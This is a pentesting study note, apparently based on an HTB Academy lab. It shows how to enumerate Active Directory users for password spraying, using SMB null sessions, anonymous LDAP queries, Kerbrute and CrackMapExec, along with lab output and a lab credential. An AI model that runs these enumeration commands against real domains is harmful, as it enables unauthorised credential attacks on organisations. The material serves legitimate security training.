# Password Spraying - Making a Target User List ACTIVE Directory

* By leveraging an SMB NULL session
  * retrieve a complete list of domain users from the domain controller
* Utilizing an LDAP anonymous bind to query LDAP anonymously
  * pull down the domain user list
* Use tool such as
  *   [kerbrute.md](kerbrute.md "mention") to validate users utilizing a word list

      * from a source such as the
        * [linkedin2username.md](linkedin2username.md "mention")
        * [statistically-likely-usernames.md](statistically-likely-usernames.md "mention")
      * [llmnr-poisoning.md](llmnr-poisoning.md "mention")

      <br>



### Using enum4linux

#### SMB NULL Session to Pull User List

```shell-session
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```shell-session
administrator
guest
krbtgt
```



### Using rpcclient

#### SMB NULL Session to Pull User List

```shell-session
 rpcclient -U "" -N 172.16.5.5
```

```shell-session
enumdomusers 
```

```
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers user:[administrator] rid:[0x1f4] user:[guest] rid:[0x1f5]
```



### Using CrackMapExec --users Flag

#### SMB NULL Session to Pull User List



```shell-session
crackmapexec smb 172.16.5.5 --users
```





```
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm
```





### Gathering Users with LDAP Anonymous

* Some examples include windapsearch and ldapsearch.

#### Using ldapsearch

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

### Using windapsearch

[windapsearch.md](windapsearch.md "mention")

### Enumerating Users with Kerbrute

* look into [statistically-likely-usernames.md](statistically-likely-usernames.md "mention") for username list
  * [linkedin2username.md](linkedin2username.md "mention")
  * jsmith.txt is from this list

```shell-session
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt 
```

* &#x20;Using Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
  * will be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy





### Credentialed Enumeration to Build our User List

* With valid credentials,
  * can use any of the tools stated previously to build a user list. A quick and easy way is using CrackMapExec.

**Using CrackMapExec with Valid Credentials**

```shell-session
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
